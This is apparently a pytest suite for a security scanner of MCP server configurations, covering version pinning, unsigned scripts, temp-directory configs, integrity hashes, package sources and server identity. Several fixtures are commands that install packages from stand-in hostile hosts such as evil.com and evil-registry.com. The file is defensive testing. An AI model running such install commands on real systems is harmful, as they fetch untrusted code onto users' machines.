"""Unit tests for all Integrity checks.

Covers:
- INTG-001: Missing Version Pinning
- INTG-002: Unsigned Server Binaries
- INTG-003: Config Tampering Risk
- INTG-004: Missing Integrity Verification
- SC-001: Untrusted Package Sources
- SHADOW-001: Generic Server Names
- SHADOW-002: Unverified Server Identity

Each check is tested for:
- Metadata loads correctly
- FAIL on vulnerable configurations
- PASS on secure configurations
- Edge cases and skip behaviour
"""

from __future__ import annotations

import pytest

from medusa.checks.integrity.intg001_missing_version_pinning import MissingVersionPinningCheck
from medusa.checks.integrity.intg002_unsigned_server_binaries import UnsignedServerBinariesCheck
from medusa.checks.integrity.intg003_config_tampering_risk import ConfigTamperingRiskCheck
from medusa.checks.integrity.intg004_missing_integrity_verification import (
    MissingIntegrityVerificationCheck,
)
from medusa.checks.integrity.sc001_untrusted_package_sources import UntrustedPackageSourcesCheck
from medusa.checks.integrity.shadow001_duplicate_server_names import GenericServerNameCheck
from medusa.checks.integrity.shadow002_unverified_server_identity import (
    UnverifiedServerIdentityCheck,
)
from medusa.core.models import Severity, Status
from tests.conftest import make_snapshot

# ==========================================================================
# INTG-001: Missing Version Pinning
# ==========================================================================


class TestIntg001MissingVersionPinning:
    """Tests for MissingVersionPinningCheck."""

    @pytest.fixture()
    def check(self) -> MissingVersionPinningCheck:
        return MissingVersionPinningCheck()

    async def test_metadata_loads_correctly(self, check: MissingVersionPinningCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "intg001"
        assert meta.category == "integrity"
        assert meta.severity == Severity.MEDIUM

    async def test_fails_on_npx_y_without_version(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command="npx",
            args=["-y", "some-server"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "npx" in findings[0].status_extended.lower()
        assert "some-server" in findings[0].status_extended

    async def test_fails_on_npx_yes_without_version(
        self, check: MissingVersionPinningCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npx",
            args=["--yes", "@scope/package"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_passes_on_npx_y_with_version(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command="npx",
            args=["-y", "@scope/package@1.2.3"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_fails_on_uvx_without_version(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command="uvx",
            args=["mcp-server"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "uvx" in findings[0].status_extended.lower()

    async def test_passes_on_uvx_with_version(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command="uvx",
            args=["mcp-server@2.0.1"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_skips_http_transport(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command="npx",
            args=["-y", "server"],
            transport_type="http",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_skips_non_package_manager_command(
        self, check: MissingVersionPinningCheck
    ) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["dist/index.js"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_skips_npx_without_y_flag(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command="npx",
            args=["some-server"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        # No -y flag means no auto-install, so PASS
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_skips_when_no_command(self, check: MissingVersionPinningCheck) -> None:
        snapshot = make_snapshot(
            command=None,
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0


# ==========================================================================
# INTG-002: Unsigned Server Binaries
# ==========================================================================


class TestIntg002UnsignedServerBinaries:
    """Tests for UnsignedServerBinariesCheck."""

    @pytest.fixture()
    def check(self) -> UnsignedServerBinariesCheck:
        return UnsignedServerBinariesCheck()

    async def test_metadata_loads_correctly(self, check: UnsignedServerBinariesCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "intg002"
        assert meta.category == "integrity"
        assert meta.severity == Severity.MEDIUM

    async def test_fails_on_node_script_no_integrity(
        self, check: UnsignedServerBinariesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["server.js"],
            transport_type="stdio",
            config_raw={"command": "node", "args": ["server.js"]},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "server.js" in findings[0].status_extended

    async def test_fails_on_python_script_no_integrity(
        self, check: UnsignedServerBinariesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="python3",
            args=["app.py"],
            transport_type="stdio",
            config_raw={"command": "python3"},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_passes_on_script_with_sha256(self, check: UnsignedServerBinariesCheck) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["server.js"],
            transport_type="stdio",
            config_raw={
                "command": "node",
                "args": ["server.js"],
                "sha256": "abc123def456",
            },
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_passes_on_nested_integrity_key(self, check: UnsignedServerBinariesCheck) -> None:
        snapshot = make_snapshot(
            command="python",
            args=["main.py"],
            transport_type="stdio",
            config_raw={
                "command": "python",
                "verification": {"checksum": "sha256:abc123"},
            },
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_skips_http_transport(self, check: UnsignedServerBinariesCheck) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["server.js"],
            transport_type="http",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_skips_non_script_command(self, check: UnsignedServerBinariesCheck) -> None:
        snapshot = make_snapshot(
            command="npx",
            args=["-y", "some-package"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_skips_no_script_extension(self, check: UnsignedServerBinariesCheck) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["--inspect", "--max-old-space-size=4096"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_fails_on_no_config_raw(self, check: UnsignedServerBinariesCheck) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["index.js"],
            transport_type="stdio",
            config_raw=None,
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL


# ==========================================================================
# INTG-003: Config Tampering Risk
# ==========================================================================


class TestIntg003ConfigTamperingRisk:
    """Tests for ConfigTamperingRiskCheck."""

    @pytest.fixture()
    def check(self) -> ConfigTamperingRiskCheck:
        return ConfigTamperingRiskCheck()

    async def test_metadata_loads_correctly(self, check: ConfigTamperingRiskCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "intg003"
        assert meta.category == "integrity"
        assert meta.severity == Severity.MEDIUM

    async def test_fails_on_tmp_path(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path="/tmp/mcp-config.json",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "/tmp/" in findings[0].status_extended

    async def test_fails_on_var_tmp_path(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path="/var/tmp/servers.json",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_fails_on_dev_shm_path(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path="/dev/shm/config.yaml",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_passes_on_home_config_path(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path="/home/user/.config/mcp/servers.json",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_passes_on_user_directory(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path="/Users/dev/.mcp/config.json",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_skips_no_config_path(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path=None,
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_fails_on_embedded_temp_directory(self, check: ConfigTamperingRiskCheck) -> None:
        snapshot = make_snapshot(
            config_file_path="/home/user/tmp/config.json",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL


# ==========================================================================
# INTG-004: Missing Integrity Verification
# ==========================================================================


class TestIntg004MissingIntegrityVerification:
    """Tests for MissingIntegrityVerificationCheck."""

    @pytest.fixture()
    def check(self) -> MissingIntegrityVerificationCheck:
        return MissingIntegrityVerificationCheck()

    async def test_metadata_loads_correctly(self, check: MissingIntegrityVerificationCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "intg004"
        assert meta.category == "integrity"
        assert meta.severity == Severity.HIGH

    async def test_fails_on_tools_without_baseline(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[{"name": "tool1", "description": "A tool"}],
            config_raw={"command": "node", "args": ["server.js"]},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "1 tool(s)" in findings[0].status_extended

    async def test_passes_on_tools_with_hashes(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[{"name": "tool1", "description": "A tool"}],
            config_raw={
                "command": "node",
                "hashes": {"tool1": "sha256:abc123"},
            },
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_passes_on_tools_with_baseline(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[{"name": "tool1", "description": "A tool"}],
            config_raw={
                "command": "node",
                "baseline": {"tools": ["tool1"]},
            },
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_passes_on_nested_integrity_key(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[{"name": "tool1", "description": "A tool"}],
            config_raw={
                "command": "node",
                "verification": {"checksums": {"tool1": "abc"}},
            },
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_skips_when_no_tools(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[],
            config_raw={"command": "node"},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_fails_on_no_config(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[{"name": "tool1", "description": "A tool"}],
            config_raw=None,
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_fails_on_multiple_tools_no_baseline(
        self, check: MissingIntegrityVerificationCheck
    ) -> None:
        snapshot = make_snapshot(
            tools=[
                {"name": "tool1", "description": "First tool"},
                {"name": "tool2", "description": "Second tool"},
                {"name": "tool3", "description": "Third tool"},
            ],
            config_raw={"command": "node", "args": ["server.js"]},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "3 tool(s)" in findings[0].status_extended


# ==========================================================================
# SC-001: Untrusted Package Sources
# ==========================================================================


class TestSc001UntrustedPackageSources:
    """Tests for UntrustedPackageSourcesCheck."""

    @pytest.fixture()
    def check(self) -> UntrustedPackageSourcesCheck:
        return UntrustedPackageSourcesCheck()

    async def test_metadata_loads_correctly(self, check: UntrustedPackageSourcesCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "sc001"
        assert meta.category == "integrity"
        assert meta.severity == Severity.HIGH

    async def test_fails_on_custom_registry(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry", "https://evil-registry.com"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
        assert "evil-registry.com" in fail_findings[0].status_extended

    async def test_fails_on_custom_registry_equals_syntax(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry=https://malicious.io/npm"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1

    async def test_passes_on_official_npm_registry(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry", "https://registry.npmjs.org"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_fails_on_pip_install_from_url(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="pip",
            args=["install", "https://evil.com/malicious-1.0.tar.gz"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
        assert "evil.com" in fail_findings[0].status_extended

    async def test_passes_on_pip_install_package_name(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="pip",
            args=["install", "requests==2.31.0"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_fails_on_npm_install_git_no_hash(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "git+https://github.com/user/repo"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        fail_findings = [f for f in findings if f.status == Status.FAIL]
        assert len(fail_findings) >= 1
        assert "commit hash" in fail_findings[0].status_extended.lower()

    async def test_passes_on_npm_install_git_with_hash(
        self, check: UntrustedPackageSourcesCheck
    ) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "git+https://github.com/user/repo#abc1234567890"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        # Should pass since it has a commit hash pin
        pass_findings = [f for f in findings if f.status == Status.PASS]
        assert len(pass_findings) >= 1

    async def test_skips_http_transport(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "--registry", "https://evil.com"],
            transport_type="http",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_skips_non_package_manager(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="node",
            args=["server.js"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 0

    async def test_passes_on_clean_npm_install(self, check: UntrustedPackageSourcesCheck) -> None:
        snapshot = make_snapshot(
            command="npm",
            args=["install", "express"],
            transport_type="stdio",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS


# ==========================================================================
# SHADOW-001: Generic Server Names
# ==========================================================================


class TestShadow001GenericServerNames:
    """Tests for GenericServerNameCheck."""

    @pytest.fixture()
    def check(self) -> GenericServerNameCheck:
        return GenericServerNameCheck()

    async def test_metadata_loads_correctly(self, check: GenericServerNameCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "shadow001"
        assert meta.category == "integrity"
        assert meta.severity == Severity.HIGH

    async def test_fails_on_generic_name_server(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="server")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "generic" in findings[0].status_extended.lower()

    async def test_fails_on_generic_name_test(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="test")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_fails_on_generic_name_mcp(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="mcp")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_fails_on_short_name(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="ab")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "too short" in findings[0].status_extended.lower()

    async def test_fails_on_single_char_name(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="x")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_passes_on_descriptive_name(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="acme-corp-billing-api")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_passes_on_unique_name(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="weather-service-prod")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_case_insensitive(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(server_name="Server")
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_runs_on_http_transport(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(
            server_name="test",
            transport_type="http",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_runs_on_sse_transport(self, check: GenericServerNameCheck) -> None:
        snapshot = make_snapshot(
            server_name="good-unique-server-name",
            transport_type="sse",
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS


# ==========================================================================
# SHADOW-002: Unverified Server Identity
# ==========================================================================


class TestShadow002UnverifiedServerIdentity:
    """Tests for UnverifiedServerIdentityCheck."""

    @pytest.fixture()
    def check(self) -> UnverifiedServerIdentityCheck:
        return UnverifiedServerIdentityCheck()

    async def test_metadata_loads_correctly(self, check: UnverifiedServerIdentityCheck) -> None:
        meta = check.metadata()
        assert meta.check_id == "shadow002"
        assert meta.category == "integrity"
        assert meta.severity == Severity.MEDIUM

    async def test_fails_on_empty_server_info(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(server_info={})
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert (
            "empty" in findings[0].status_extended.lower()
            or "missing" in findings[0].status_extended.lower()
        )

    async def test_fails_on_missing_name(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(server_info={"version": "1.0.0"})
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "name" in findings[0].status_extended.lower()

    async def test_fails_on_missing_version(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(server_info={"name": "my-server"})
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
        assert "version" in findings[0].status_extended.lower()

    async def test_fails_on_empty_name(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(server_info={"name": "", "version": "1.0.0"})
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_fails_on_whitespace_name(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(server_info={"name": "   ", "version": "1.0.0"})
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_passes_on_complete_server_info(
        self, check: UnverifiedServerIdentityCheck
    ) -> None:
        snapshot = make_snapshot(
            server_info={"name": "my-server", "version": "1.0.0"}
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_passes_on_server_info_with_extras(
        self, check: UnverifiedServerIdentityCheck
    ) -> None:
        snapshot = make_snapshot(
            server_info={
                "name": "acme-billing",
                "version": "2.3.1",
                "vendor": "Acme Corp",
            }
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_runs_on_stdio_transport(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(
            transport_type="stdio",
            server_info={"name": "test", "version": "1.0.0"},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.PASS

    async def test_runs_on_http_transport(self, check: UnverifiedServerIdentityCheck) -> None:
        snapshot = make_snapshot(
            transport_type="http",
            server_info={},
        )
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL

    async def test_fails_on_empty_version_string(
        self, check: UnverifiedServerIdentityCheck
    ) -> None:
        snapshot = make_snapshot(server_info={"name": "server", "version": ""})
        findings = await check.execute(snapshot)
        assert len(findings) == 1
        assert findings[0].status == Status.FAIL
